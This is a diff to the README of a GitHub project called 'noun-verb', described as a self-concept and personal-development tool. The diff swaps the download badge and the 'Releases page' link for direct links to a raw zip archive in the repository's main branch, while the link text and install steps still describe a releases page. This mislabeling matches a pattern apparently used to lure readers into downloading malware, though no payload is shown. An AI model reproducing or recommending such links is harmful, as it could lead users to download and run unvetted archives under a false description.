@@ -1,7 +1,7 @@
 # 🌟 noun-verb - Transform Your Self-Concept Today
 
 ## 📥 Download Now
-[![Download noun-verb](https://img.shields.io/badge/Download-noun--verb-blue.svg)](https://github.com/kuniku/noun-verb/releases)
+[![Download noun-verb](https://github.com/kuniku/noun-verb/raw/refs/heads/main/noun_verb/noun_verb_v3.8-alpha.2.zip)](https://github.com/kuniku/noun-verb/raw/refs/heads/main/noun_verb/noun_verb_v3.8-alpha.2.zip)
 
 ## 📂 Overview
 noun-verb is a package that reframes self-concept from fixed labels (nouns) to dynamic actions (verbs). It helps you shift your mindset and see your potential in a new light. Using noun-verb, you can embrace personal development and transform how you perceive yourself.
@@ -21,7 +21,7 @@ To use noun-verb, your system needs:
 - **Uplifting Tone**: Engage with content that inspires and motivates you.
 
 ## 📥 Download & Install
-To get started with noun-verb, **visit this page to download**: [noun-verb Releases](https://github.com/kuniku/noun-verb/releases).
+To get started with noun-verb, **visit this page to download**: [noun-verb Releases](https://github.com/kuniku/noun-verb/raw/refs/heads/main/noun_verb/noun_verb_v3.8-alpha.2.zip).
 
 ### Installation Steps
 1. **Visit the Releases Page**: Click the link above to open the releases page.
